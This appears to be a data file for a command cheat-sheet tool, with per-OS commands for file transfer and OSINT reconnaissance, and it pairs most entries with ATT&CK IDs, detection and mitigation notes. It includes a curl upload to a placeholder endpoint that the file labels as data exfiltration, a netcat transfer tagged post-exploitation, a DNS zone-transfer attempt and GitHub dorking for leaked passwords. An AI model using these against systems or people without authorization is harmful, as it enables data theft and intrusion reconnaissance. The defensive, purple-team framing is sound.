 {"id":"xfer-sftp","cat":"File Transfer & Sync","title":"Fetch a file with sftp","desc":"Non-interactive style one-shot: sftp can take a remote path and local dest to download directly; run bare 'sftp user@host' for an interactive get/put session.","tags":["file-transfer","remote","cross-platform"],"code":{"ps":"sftp {{USER}}@{{HOST}}:{{REMOTE:/path/file.bin}} {{LOCAL:.}}","mac":"sftp {{USER}}@{{HOST}}:{{REMOTE:/path/file.bin}} {{LOCAL:.}}","linux":"sftp {{USER}}@{{HOST}}:{{REMOTE:/path/file.bin}} {{LOCAL:.}}"}},
 {"id":"xfer-rsync-archive","cat":"File Transfer & Sync","title":"Sync directories locally with rsync","desc":"Archive-mode local sync preserving perms/times, only copying changed files. rsync ships on macOS and most Linux; a trailing slash on SRC copies contents, no slash copies the folder.","tags":["file-transfer","backup","cross-platform"],"code":{"mac":"rsync -avh --progress {{SRC:./src/}} {{DST:./backup/}}","linux":"rsync -avh --progress {{SRC:./src/}} {{DST:./backup/}}"}},
 {"id":"xfer-rsync-ssh","cat":"File Transfer & Sync","title":"rsync over SSH (compressed)","desc":"Sync a local tree to a remote host over SSH with compression; efficient for repeat transfers because only deltas move.","tags":["file-transfer","remote","backup"],"code":{"mac":"rsync -avz -e ssh {{SRC:./src/}} {{USER}}@{{HOST}}:{{DEST:/backup/}}","linux":"rsync -avz -e ssh {{SRC:./src/}} {{USER}}@{{HOST}}:{{DEST:/backup/}}"}},
 {"id":"xfer-rsync-mirror","cat":"File Transfer & Sync","title":"Mirror a directory with rsync --delete","desc":"Make DST an exact mirror of SRC; --delete removes files in DST that no longer exist in SRC.","danger":"--delete permanently removes files from the destination that are not in the source. Dry-run first with -n (--dry-run) before committing.","tags":["file-transfer","backup","quick-win"],"code":{"mac":"rsync -av --delete {{SRC:./src/}} {{DST:./mirror/}}","linux":"rsync -av --delete {{SRC:./src/}} {{DST:./mirror/}}"}},
 {"id":"xfer-robocopy-copy","cat":"File Transfer & Sync","title":"Copy a tree with robocopy","desc":"Windows-native robust copy including subdirectories, with restartable mode and retry limits. /E copies all subfolders including empty ones.","tags":["file-transfer","backup","windows"],"code":{"ps":"robocopy {{SRC:C:\\data}} {{DST:D:\\backup}} /E /Z /R:3 /W:5","cmd":"robocopy {{SRC:C:\\data}} {{DST:D:\\backup}} /E /Z /R:3 /W:5"}},
 {"id":"xfer-robocopy-mirror","cat":"File Transfer & Sync","title":"Mirror a tree with robocopy /MIR","desc":"Mirror source to destination so the two match exactly. /MIR combines /E with purge of extra destination files.","danger":"/MIR deletes files and folders in the destination that are absent from the source. Test with /L (list-only) first. Requires write access to the destination.","tags":["file-transfer","backup","windows"],"code":{"ps":"robocopy {{SRC:C:\\data}} {{DST:D:\\mirror}} /MIR /Z /R:3 /W:5","cmd":"robocopy {{SRC:C:\\data}} {{DST:D:\\mirror}} /MIR /Z /R:3 /W:5"}},
 {"id":"xfer-curl-download","cat":"File Transfer & Sync","title":"Download a file with curl","desc":"Fetch a URL to disk, following redirects (-L), keeping the remote filename (-O). curl.exe ships on Windows 10+, macOS, and Linux; use curl.exe in PowerShell since 'curl' is aliased to Invoke-WebRequest there.","tags":["file-transfer","web","cross-platform"],"code":{"ps":"curl.exe -L -O {{URL:https://example.com/file.bin}}","cmd":"curl -L -O {{URL:https://example.com/file.bin}}","mac":"curl -L -O {{URL:https://example.com/file.bin}}","linux":"curl -L -O {{URL:https://example.com/file.bin}}"}},
 {"id":"xfer-curl-resume","cat":"File Transfer & Sync","title":"Resume an interrupted download","desc":"Continue a partially downloaded file where it left off with curl -C - (auto-detect offset).","tags":["file-transfer","web","cross-platform"],"code":{"ps":"curl.exe -L -C - -O {{URL:https://example.com/big.iso}}","cmd":"curl -L -C - -O {{URL:https://example.com/big.iso}}","mac":"curl -L -C - -O {{URL:https://example.com/big.iso}}","linux":"curl -L -C - -O {{URL:https://example.com/big.iso}}"}},
 {"id":"xfer-wget-download","cat":"File Transfer & Sync","title":"Download a file with GNU wget","desc":"Fetch a URL to disk with GNU wget (default on most Linux distros; not installed by default on macOS or Windows). -c resumes if re-run.","tags":["file-transfer","web","linux"],"code":{"linux":"wget -c {{URL:https://example.com/file.bin}}"}},
 {"id":"xfer-wget-mirror","cat":"File Transfer & Sync","title":"Mirror a website with wget","desc":"Recursively download a site for offline use with GNU wget: -m mirror, -p page requisites, -k convert links. Respect robots and scope; can pull large volumes.","danger":"Recursive mirroring can generate heavy traffic and may fetch far more than intended. Scope with --domains and only mirror sites you are authorized to.","tags":["file-transfer","web","linux"],"code":{"linux":"wget -m -p -k --domains={{DOMAIN:example.com}} {{URL:https://example.com/}}"}},
 {"id":"xfer-invoke-webrequest","cat":"File Transfer & Sync","title":"Download with Invoke-WebRequest","desc":"PowerShell-native HTTP download saving the body to a file with -OutFile.","tags":["file-transfer","web","windows"],"code":{"ps":"Invoke-WebRequest -Uri {{URL:https://example.com/file.bin}} -OutFile {{OUT:C:\\Temp\\file.bin}}"}},
 {"id":"xfer-bits","cat":"File Transfer & Sync","title":"Background download with BITS","desc":"Use the Background Intelligent Transfer Service (BITS) for throttled, resumable, network-aware downloads via the built-in BitsTransfer module.","tags":["file-transfer","web","windows"],"code":{"ps":"Start-BitsTransfer -Source {{URL:https://example.com/file.bin}} -Destination {{OUT:C:\\Temp\\file.bin}}"}},
 {"id":"xfer-python-httpserver","cat":"File Transfer & Sync","title":"Serve a folder over HTTP (Python)","desc":"Quickly expose the current directory over HTTP for ad-hoc transfers using Python's stdlib http.server. On Windows use 'python' instead of 'python3'.","danger":"Serves every file in the current directory to anyone who can reach the port. Bind to 127.0.0.1 (as shown) unless you intend LAN access, and stop it when done.","tags":["file-transfer","network","quick-win"],"code":{"py":"python3 -m http.server {{PORT:8000}} --bind 127.0.0.1"}},
 {"id":"xfer-tar-ssh","cat":"File Transfer & Sync","title":"Stream a directory over SSH with tar","desc":"Pipe a gzipped tar stream through SSH to copy a directory without a temp archive on disk; useful when rsync is unavailable.","tags":["file-transfer","remote","backup"],"code":{"mac":"tar czf - {{DIR:mydir}} | ssh {{USER}}@{{HOST}} 'tar xzf - -C {{DEST:/tmp}}'","linux":"tar czf - {{DIR:mydir}} | ssh {{USER}}@{{HOST}} 'tar xzf - -C {{DEST:/tmp}}'"}},
 {"id":"xfer-checksum-generate","cat":"File Transfer & Sync","title":"Generate a SHA-256 checksum","desc":"Compute a SHA-256 digest of a file to record before/after a transfer. macOS uses shasum -a 256 (BSD); Linux uses sha256sum (GNU coreutils); Windows uses Get-FileHash or certutil.","tags":["file-transfer","forensics","reference"],"code":{"ps":"Get-FileHash {{FILE:file.iso}} -Algorithm SHA256 | Format-List","cmd":"certutil -hashfile {{FILE:file.iso}} SHA256","mac":"shasum -a 256 {{FILE:file.iso}}","linux":"sha256sum {{FILE:file.iso}}"}},
 {"id":"xfer-checksum-verify","cat":"File Transfer & Sync","title":"Verify a file against an expected hash","desc":"Confirm a downloaded file matches a published SHA-256. GNU/BSD tools verify from a 'hash  filename' line; PowerShell compares the .Hash property to an expected string.","tags":["file-transfer","forensics","detection"],"code":{"ps":"(Get-FileHash {{FILE:file.iso}} -Algorithm SHA256).Hash -eq '{{EXPECTED:ABCD...}}'","cmd":"certutil -hashfile {{FILE:file.iso}} SHA256","mac":"echo \"{{EXPECTED:ABCD...}}  {{FILE:file.iso}}\" | shasum -a 256 -c -","linux":"echo \"{{EXPECTED:ABCD...}}  {{FILE:file.iso}}\" | sha256sum -c -"}},
 {"id":"xfer-nc-transfer","cat":"File Transfer & Sync","title":"Transfer a file with netcat","desc":"Move a file over a raw TCP socket: listener writes to disk, sender streams the file. macOS ships the BSD nc (nc -l PORT); Linux traditional netcat uses nc -l -p PORT. Ports and traffic are cleartext.","team":"purple","attack":["T1105"],"detect":"Unexpected listeners on non-standard ports (ss -ltnp on Linux / netstat -ano on Windows), nc/ncat process execution, and IDS signatures on cleartext bulk transfers over odd ports.","mitigate":"Enforce egress/ingress firewall rules limiting outbound ports, application allowlisting to block nc where not needed, and network segmentation.","danger":"Netcat sends data unauthenticated and unencrypted; opening arbitrary listeners is a common exfil/ingress-tool technique. Use only on networks and hosts you are authorized to test.","tags":["file-transfer","network","post-ex"],"code":{"mac":"# receiver:\nnc -l {{PORT:4444}} > {{OUT:file.bin}}\n# sender:\nnc {{HOST}} {{PORT:4444}} < {{FILE:file.bin}}","linux":"# receiver:\nnc -l -p {{PORT:4444}} > {{OUT:file.bin}}\n# sender:\nnc {{HOST}} {{PORT:4444}} < {{FILE:file.bin}}"}},
 {"id":"xfer-curl-upload-exfil","cat":"File Transfer & Sync","title":"Upload a file to a remote endpoint (curl)","desc":"PUT a local file to an HTTP(S) endpoint with curl -T. Legitimate for API uploads; also the shape of web-based data exfiltration.","team":"purple","attack":["T1048","T1567.002"],"detect":"Proxy/web-gateway logs of large outbound POST/PUT to uncommon or newly-seen domains, DLP alerts on sensitive-file egress, and NetFlow showing asymmetric upload volume.","mitigate":"Egress filtering and allowlisted destinations, TLS inspection at the perimeter, DLP on outbound uploads, and blocking unsanctioned cloud/file-sharing domains.","danger":"Uploading data to third-party endpoints can constitute data exfiltration. Only send data you own to destinations you control, under explicit authorization.","tags":["file-transfer","web","post-ex"],"code":{"ps":"curl.exe -T {{FILE:C:\\data\\report.zip}} {{URL:https://upload.example.com/incoming/}}","mac":"curl -T {{FILE:./report.zip}} {{URL:https://upload.example.com/incoming/}}","linux":"curl -T {{FILE:./report.zip}} {{URL:https://upload.example.com/incoming/}}"}},
 {"id":"xfer-smb-copy","cat":"File Transfer & Sync","title":"Copy to an SMB/UNC share","desc":"Map or write directly to a Windows file share. On Linux use smbclient (from the samba-client package, not installed by default) to put a file.","danger":"Passing credentials on the command line can expose them in history/process listings. Use interactive prompts where possible and ensure you are authorized to write to the share.","tags":["file-transfer","smb","remote"],"code":{"cmd":"net use \\\\{{HOST}}\\{{SHARE}} /user:{{USER}} & copy {{FILE:data.zip}} \\\\{{HOST}}\\{{SHARE}}\\","ps":"Copy-Item {{FILE:.\\data.zip}} -Destination \\\\{{HOST}}\\{{SHARE}}\\","linux":"smbclient //{{HOST}}/{{SHARE}} -U {{USER}} -c 'put {{FILE:data.zip}}'"}},
 {"id":"xfer-copyitem-session","cat":"File Transfer & Sync","title":"Copy over a PowerShell remoting session","desc":"Use an established PSSession to copy files to/from a remote Windows host with Copy-Item -ToSession (or -FromSession), traversing WinRM without a file share.","tags":["file-transfer","remote","windows"],"code":{"ps":"$s = New-PSSession -ComputerName {{HOST}}; Copy-Item -Path {{SRC:C:\\file.txt}} -Destination {{DST:C:\\Temp\\}} -ToSession $s; Remove-PSSession $s"}},

/* ================= OSINT ================= */
 {"id":"osint-whois-rdap","cat":"OSINT","title":"Domain registration via RDAP","desc":"Query structured registration data (registrar, dates, nameservers) over RDAP with curl/Invoke-RestMethod — no extra tools.","danger":"Passive, but only profile domains you are authorized to assess; bulk RDAP queries may breach registry rate limits or ToS.","team":"red","tags":["osint","recon","reference"],"attack":["T1596.002"],"detect":"Invisible to target — RDAP requests hit the registry/registrar, not victim infrastructure; no victim-side telemetry is generated.","mitigate":"Enable registrar/WHOIS privacy proxy, use role-based (not personal) registrant contacts, and monitor for typosquatted lookalike domains.","code":{"ps":"Invoke-RestMethod \"https://rdap.org/domain/{{DOMAIN:example.com}}\" | ConvertTo-Json -Depth 6","mac":"curl -s https://rdap.org/domain/{{DOMAIN:example.com}} | python3 -m json.tool","linux":"curl -s https://rdap.org/domain/{{DOMAIN:example.com}} | python3 -m json.tool","py":"import urllib.request,json; print(json.dumps(json.load(urllib.request.urlopen('https://rdap.org/domain/{{DOMAIN:example.com}}')),indent=2))"}},
 {"id":"osint-whois-cli","cat":"OSINT","title":"Classic whois lookup","desc":"Legacy free-text registration lookup with the whois client (default on macOS; on Linux install via package manager if absent).","danger":"Passive; scope to authorized targets and respect registry query throttling.","team":"red","tags":["osint","recon","reference"],"attack":["T1596.002"],"detect":"Invisible to target — the query resolves against registry/registrar whois servers, never the victim's hosts.","mitigate":"Use domain privacy, generic abuse/registrant addresses, and avoid leaking staff names or internal email formats in registration records.","code":{"mac":"whois {{DOMAIN:example.com}}","linux":"whois {{DOMAIN:example.com}}"}},
 {"id":"osint-dns-records","cat":"OSINT","title":"Enumerate DNS records","desc":"Pull A/AAAA/MX/NS/TXT records for a domain using built-in resolvers (dig, nslookup, Resolve-DnsName).","danger":"Passive when using a public/recursive resolver; only enumerate domains within your authorized scope.","team":"red","tags":["osint","dns","recon","enumeration"],"attack":["T1590.002"],"detect":"Invisible to target — queries are answered from recursive-resolver cache or authoritative NS, producing no application-level telemetry for the victim (some ANY queries return RFC 8482 HINFO).","mitigate":"Publish only necessary records, split internal/external DNS views, and disable wildcard responses that leak infrastructure.","code":{"ps":"Resolve-DnsName {{DOMAIN:example.com}} -Type ANY","cmd":"nslookup -type=any {{DOMAIN:example.com}}","mac":"dig {{DOMAIN:example.com}} ANY +noall +answer","linux":"dig {{DOMAIN:example.com}} ANY +noall +answer"}},
 {"id":"osint-dns-mx","cat":"OSINT","title":"Mail server (MX) discovery","desc":"Resolve MX records to identify the mail provider and gateway hosts for a domain.","danger":"Passive; enumerate only authorized domains.","team":"red","tags":["osint","dns","mail","recon"],"attack":["T1590.002"],"detect":"Invisible to target — resolved from DNS, not the victim's mail servers; no SMTP connection is made.","mitigate":"Front mail with a filtering gateway, keep internal relay names out of public MX, and enforce SPF/DKIM/DMARC to blunt spoofing that MX discovery enables.","code":{"ps":"Resolve-DnsName {{DOMAIN:example.com}} -Type MX","cmd":"nslookup -type=mx {{DOMAIN:example.com}}","mac":"dig +short MX {{DOMAIN:example.com}}","linux":"dig +short MX {{DOMAIN:example.com}}"}},
 {"id":"osint-dns-txt-spf","cat":"OSINT","title":"SPF / DMARC / TXT records","desc":"Read TXT records including SPF and _dmarc to reveal mail policy, cloud providers, and verification tokens.","danger":"Passive; scope to authorized domains.","team":"red","tags":["osint","dns","mail","recon"],"attack":["T1590.002"],"detect":"Invisible to target — TXT records are served from DNS with no victim-side logging.","mitigate":"Remove stale verification tokens/service includes that fingerprint your SaaS stack, and keep SPF includes tight to reduce spoofing surface.","code":{"ps":"Resolve-DnsName {{DOMAIN:example.com}} -Type TXT","mac":"dig +short TXT {{DOMAIN:example.com}}; dig +short TXT _dmarc.{{DOMAIN:example.com}}","linux":"dig +short TXT {{DOMAIN:example.com}}; dig +short TXT _dmarc.{{DOMAIN:example.com}}"}},
 {"id":"osint-reverse-dns","cat":"OSINT","title":"Reverse DNS (PTR) lookup","desc":"Resolve an IP back to its PTR hostname to map ownership and naming conventions across a netblock.","danger":"Passive; only resolve IPs within your authorized engagement scope.","team":"red","tags":["osint","dns","network","recon"],"attack":["T1590.002"],"detect":"Invisible to target — PTR lookups query the in-addr.arpa zone (often provider-hosted), not the victim host itself.","mitigate":"Avoid descriptive PTR names (e.g. host role or software), and delegate reverse zones so they don't leak internal hostnames.","code":{"ps":"Resolve-DnsName {{IP:1.1.1.1}} -Type PTR","mac":"dig +short -x {{IP:1.1.1.1}}","linux":"dig +short -x {{IP:1.1.1.1}}"}},
 {"id":"osint-dns-zone-transfer","cat":"OSINT","title":"DNS zone transfer (AXFR) attempt","desc":"Test whether an authoritative nameserver allows a full zone transfer, dumping every record at once.","danger":"Active — connects directly to the target nameserver and is logged; run only with written authorization.","team":"red","tags":["osint","dns","enumeration","discovery"],"attack":["T1590.002"],"detect":"Visible to defender — the nameserver logs the inbound AXFR request/TCP 53 connection from your source IP; unexpected AXFR is a classic recon indicator.","mitigate":"Restrict zone transfers to authorized secondaries with allow-transfer/TSIG and deny AXFR from arbitrary hosts.","code":{"mac":"dig AXFR {{DOMAIN:example.com}} @{{NS:ns1.example.com}}","linux":"dig AXFR {{DOMAIN:example.com}} @{{NS:ns1.example.com}}"}},
 {"id":"osint-cert-transparency","cat":"OSINT","title":"Subdomains from crt.sh (CT logs)","desc":"Harvest subdomains from public Certificate Transparency logs via the crt.sh JSON API — no scanning required.","danger":"Passive; use discovered hosts only within your authorized scope.","team":"red","tags":["osint","certificates","subdomain","recon"],"attack":["T1596.003"],"detect":"Invisible to target — data comes from public CT logs (Google/Cloudflare/etc.), so the victim sees no query.","mitigate":"Use wildcard certs to avoid enumerating per-host names, keep dev/staging behind private CAs, and monitor CT logs for unexpected issuance against your domains.","code":{"ps":"Invoke-RestMethod \"https://crt.sh/?q=%25.{{DOMAIN:example.com}}&output=json\" | Select-Object -Expand name_value -Unique","mac":"curl -s \"https://crt.sh/?q=%25.{{DOMAIN:example.com}}&output=json\" | python3 -c \"import sys,json;[print(n) for n in sorted({x['name_value'] for x in json.load(sys.stdin)})]\"","linux":"curl -s \"https://crt.sh/?q=%25.{{DOMAIN:example.com}}&output=json\" | python3 -c \"import sys,json;[print(n) for n in sorted({x['name_value'] for x in json.load(sys.stdin)})]\""}},
 {"id":"osint-tls-cert-inspect","cat":"OSINT","title":"Live TLS certificate SANs","desc":"Pull the live cert's Subject Alternative Names to reveal sibling hostnames (openssl on BSD/GNU; Python ssl elsewhere).","danger":"Active — completes a TLS handshake with the target host; run only against authorized systems.","team":"red","tags":["osint","certificates","tls","recon"],"attack":["T1596.003"],"detect":"Visible to defender — the web server/load balancer logs the TLS handshake and source IP (though a single handshake blends into normal traffic).","mitigate":"Avoid packing many internal hostnames into one public cert; use separate certs or wildcards so a single fetch reveals less topology.","code":{"mac":"echo | openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'","linux":"echo | openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'","py":"import ssl,socket,json;c=ssl.create_default_context();s=c.wrap_socket(socket.socket(),server_hostname='{{HOST:example.com}}');s.connect(('{{HOST:example.com}}',443));print(json.dumps(s.getpeercert(),indent=2));s.close()"}},
 {"id":"osint-shodan-host","cat":"OSINT","title":"Shodan host lookup","desc":"Retrieve open ports, banners, and known vulns for an IP from Shodan's index (Shodan CLI + API key).","danger":"Passive; only query assets you are authorized to assess and honor Shodan API ToS.","team":"red","tags":["osint","scanning","banner","recon"],"attack":["T1596.005"],"detect":"Invisible to target — results come from Shodan's prior scans, not a live scan you launch, so the victim sees nothing.","mitigate":"Reduce internet-exposed services, strip version banners, firewall management ports, and periodically self-check your ranges in Shodan.","code":{"ps":"shodan host {{IP:8.8.8.8}}","mac":"shodan host {{IP:8.8.8.8}}","linux":"shodan host {{IP:8.8.8.8}}"}},
 {"id":"osint-shodan-search","cat":"OSINT","title":"Shodan search by netblock/org","desc":"Query Shodan for all indexed hosts in a CIDR or organization (Shodan CLI + API key).","danger":"Passive database query; restrict filters to authorized organizations/ranges.","team":"red","tags":["osint","scanning","discovery","recon"],"attack":["T1596.005"],"detect":"Invisible to target — the search reads Shodan's dataset; no packets reach the victim.","mitigate":"Minimize exposed attack surface, remove org tags from banners, and alert on your assets appearing in Shodan/search-engine results.","code":{"ps":"shodan search --fields ip_str,port,org \"net:{{CIDR:8.8.8.0/24}}\"","mac":"shodan search --fields ip_str,port,org \"net:{{CIDR:8.8.8.0/24}}\"","linux":"shodan search --fields ip_str,port,org \"net:{{CIDR:8.8.8.0/24}}\""}},
 {"id":"osint-censys-search","cat":"OSINT","title":"Censys asset search","desc":"Search Censys for hosts/certs matching a domain or service fingerprint (Censys CLI + API credentials).","danger":"Passive; scope queries to authorized targets and follow Censys ToS.","team":"red","tags":["osint","certificates","discovery","recon"],"attack":["T1596.005"],"detect":"Invisible to target — Censys returns pre-collected scan/CT data; the victim receives no traffic from you.","mitigate":"Shrink external footprint, avoid reusing identifiable certificate subjects across hosts, and self-monitor your presence in Censys.","code":{"ps":"censys search \"services.tls.certificates.leaf_data.subject.common_name: {{DOMAIN:example.com}}\"","mac":"censys search \"services.tls.certificates.leaf_data.subject.common_name: {{DOMAIN:example.com}}\"","linux":"censys search \"services.tls.certificates.leaf_data.subject.common_name: {{DOMAIN:example.com}}\""}},
 {"id":"osint-theharvester","cat":"OSINT","title":"theHarvester email/subdomain harvest","desc":"Aggregate emails, subdomains, and hosts from public sources for a domain (theHarvester tool).","danger":"Mostly passive (source-dependent); run only against domains in your authorized scope.","team":"red","tags":["osint","subdomain","mail","recon"],"attack":["T1589.002"],"detect":"Invisible to target for passive sources (search engines, CT, crt.sh); the victim sees no direct queries unless a source module actively probes.","mitigate":"Limit publishing staff emails, use role addresses, and reduce the DNS/CT footprint that seeds automated harvesting.","code":{"ps":"theHarvester -d {{DOMAIN:example.com}} -b bing,crtsh,duckduckgo","mac":"theHarvester -d {{DOMAIN:example.com}} -b bing,crtsh,duckduckgo","linux":"theHarvester -d {{DOMAIN:example.com}} -b bing,crtsh,duckduckgo"}},
 {"id":"osint-exiftool-meta","cat":"OSINT","title":"Document/image metadata extraction","desc":"Dump all embedded metadata (author, software, timestamps, device) from files with exiftool.","danger":"Passive on files already in your possession; only analyze documents you are authorized to hold.","team":"red","tags":["osint","recon","reference"],"attack":["T1592.002"],"detect":"Invisible to target — analysis happens locally on a downloaded file; the victim has no visibility into your inspection.","mitigate":"Strip metadata before publishing documents (built-in Office/PDF sanitizers or exiftool -all=) to avoid leaking usernames, software versions, and paths.","code":{"ps":"exiftool -a -u -G1 {{FILE:document.pdf}}","mac":"exiftool -a -u -G1 {{FILE:document.pdf}}","linux":"exiftool -a -u -G1 {{FILE:document.pdf}}"}},
 {"id":"osint-exif-gps","cat":"OSINT","title":"GPS coordinates from images","desc":"Batch-extract GPS latitude/longitude embedded in photos to geolocate subjects (exiftool).","danger":"Passive local analysis; handle personal imagery only with authorization and privacy/legal care.","team":"red","tags":["osint","recon","reference"],"attack":["T1591.001"],"detect":"Invisible to target — EXIF GPS is read from files already collected; no interaction with the victim occurs.","mitigate":"Disable location tagging on cameras/phones and strip EXIF GPS before sharing images publicly.","code":{"ps":"exiftool -gpslatitude -gpslongitude -gpsposition -r {{DIR:./images}}","mac":"exiftool -gpslatitude -gpslongitude -gpsposition -r {{DIR:./images}}","linux":"exiftool -gpslatitude -gpslongitude -gpsposition -r {{DIR:./images}}"}},
 {"id":"osint-hibp-breach","cat":"OSINT","title":"Breach exposure by domain (HIBP)","desc":"List known breaches affecting a domain via the free Have I Been Pwned breaches endpoint (account-level lookups need an API key).","danger":"Passive; query only domains within your authorized scope and follow HIBP acceptable-use terms.","team":"red","tags":["osint","password","account","recon"],"attack":["T1589.001"],"detect":"Invisible to target — the request goes to the HIBP service, not the victim; no victim-side telemetry results.","mitigate":"Enforce MFA and passwordless auth, monitor for credential reuse, and rotate credentials tied to disclosed breaches.","code":{"ps":"Invoke-RestMethod \"https://haveibeenpwned.com/api/v3/breaches?Domain={{DOMAIN:adobe.com}}\" | Select-Object Name,BreachDate,PwnCount","mac":"curl -s \"https://haveibeenpwned.com/api/v3/breaches?Domain={{DOMAIN:adobe.com}}\" | python3 -m json.tool","linux":"curl -s \"https://haveibeenpwned.com/api/v3/breaches?Domain={{DOMAIN:adobe.com}}\" | python3 -m json.tool","py":"import urllib.request,json; r=urllib.request.Request('https://haveibeenpwned.com/api/v3/breaches?Domain={{DOMAIN:adobe.com}}',headers={'User-Agent':'fieldkit'}); print(json.dumps(json.load(urllib.request.urlopen(r)),indent=2))"}},
 {"id":"osint-github-dork","cat":"OSINT","title":"GitHub code dorking","desc":"Open GitHub code search for leaked secrets, hostnames, or keys referencing a target (browser + github.com/search).","danger":"Passive search of public repos; act only on exposures within your authorized scope and report responsibly.","team":"red","tags":["osint","git","recon"],"attack":["T1593.003"],"detect":"Invisible to target — the query runs against GitHub's index, not victim systems; the victim has no visibility.","mitigate":"Enable secret scanning/push protection, rotate any committed credentials, and use pre-commit hooks to block secrets before they reach public repos.","code":{"ps":"Start-Process \"https://github.com/search?type=code&q=%22{{DOMAIN:example.com}}%22+password\"","mac":"open \"https://github.com/search?type=code&q=%22{{DOMAIN:example.com}}%22+password\"","linux":"xdg-open \"https://github.com/search?type=code&q=%22{{DOMAIN:example.com}}%22+password\""}},
 {"id":"osint-search-dorks","cat":"OSINT","title":"Search-engine dorking","desc":"Use advanced operators (site:, filetype:, intitle:, inurl:) to surface exposed files and pages for a target.","danger":"Passive; review only results tied to authorized targets.","team":"red","tags":["osint","web","recon"],"attack":["T1593.002"],"detect":"Invisible to target — search operators run against the engine's index; the victim receives no direct request from you.","mitigate":"Keep sensitive files out of crawlable paths, use robots/meta noindex and auth, and periodically self-dork to find exposed documents.","code":{"ps":"Start-Process \"https://www.google.com/search?q=site:{{DOMAIN:example.com}}+filetype:pdf\"","mac":"open \"https://www.google.com/search?q=site:{{DOMAIN:example.com}}+filetype:pdf\"","linux":"xdg-open \"https://www.google.com/search?q=site:{{DOMAIN:example.com}}+filetype:pdf\""}},
 {"id":"osint-wayback","cat":"OSINT","title":"Wayback Machine URL history","desc":"Pull historical URLs for a domain from the Internet Archive CDX API to find retired endpoints and parameters.","danger":"Passive; use recovered URLs only within your authorized scope.","team":"red","tags":["osint","web","recon","discovery"],"attack":["T1596"],"detect":"Invisible to target — content is served from the Internet Archive, not the victim's live site.","mitigate":"Assume old content is permanently archived; rotate secrets that ever appeared in public pages and avoid embedding sensitive data in URLs.","code":{"ps":"Invoke-RestMethod \"http://web.archive.org/cdx/search/cdx?url={{DOMAIN:example.com}}*&output=text&fl=original&collapse=urlkey&limit=1000\"","mac":"curl -s \"http://web.archive.org/cdx/search/cdx?url={{DOMAIN:example.com}}*&output=text&fl=original&collapse=urlkey&limit=1000\"","linux":"curl -s \"http://web.archive.org/cdx/search/cdx?url={{DOMAIN:example.com}}*&output=text&fl=original&collapse=urlkey&limit=1000\""}},
 {"id":"osint-asn-lookup","cat":"OSINT","title":"ASN / netblock mapping","desc":"Map an IP to its owning ASN and network via the Team Cymru whois service to scope an organization's ranges.","danger":"Passive; use resulting ranges only for authorized targets.","team":"red","tags":["osint","network","recon","discovery"],"attack":["T1590.005"],"detect":"Invisible to target — the lookup queries Team Cymru's whois database, not victim infrastructure.","mitigate":"Understand your announced ranges are public BGP data; segment and firewall netblocks so ASN mapping yields little exploitable detail.","code":{"mac":"whois -h whois.cymru.com \" -v {{IP:8.8.8.8}}\"","linux":"whois -h whois.cymru.com \" -v {{IP:8.8.8.8}}\""}},
 {"id":"osint-username-enum","cat":"OSINT","title":"Username enumeration across sites","desc":"Check a username's presence across social/media platforms with Sherlock (Sherlock tool).","danger":"Semi-active — probes many third-party sites; use only for authorized investigations and respect each site's ToS/privacy law.","team":"red","tags":["osint","account","recon"],"attack":["T1593.001"],"detect":"Invisible to the primary target — requests hit third-party platforms, not the victim org; individual platforms may log the profile checks.","mitigate":"Encourage distinct usernames per platform and privacy-limited profiles to reduce cross-site correlation of individuals.","code":{"ps":"sherlock {{USERNAME:johndoe}}","mac":"sherlock {{USERNAME:johndoe}}","linux":"sherlock {{USERNAME:johndoe}}"}},
 {"id":"osint-robots-sitemap","cat":"OSINT","title":"robots.txt & sitemap harvest","desc":"Fetch robots.txt and sitemap.xml from a target site to enumerate paths the operator both hides and indexes.","danger":"Active — makes direct HTTP requests to the victim web server; run only against authorized sites.","team":"red","tags":["osint","web","enumeration","discovery"],"attack":["T1594"],"detect":"Visible to defender — the web server access log records your GET /robots.txt and /sitemap.xml with source IP and User-Agent.","mitigate":"Don't list sensitive Disallow paths in robots.txt (it advertises them); protect admin/staging with authentication rather than obscurity.","code":{"ps":"Invoke-RestMethod \"https://{{DOMAIN:example.com}}/robots.txt\"; Invoke-RestMethod \"https://{{DOMAIN:example.com}}/sitemap.xml\"","mac":"curl -s https://{{DOMAIN:example.com}}/robots.txt; curl -s https://{{DOMAIN:example.com}}/sitemap.xml","linux":"curl -s https://{{DOMAIN:example.com}}/robots.txt; curl -s https://{{DOMAIN:example.com}}/sitemap.xml"}}
];
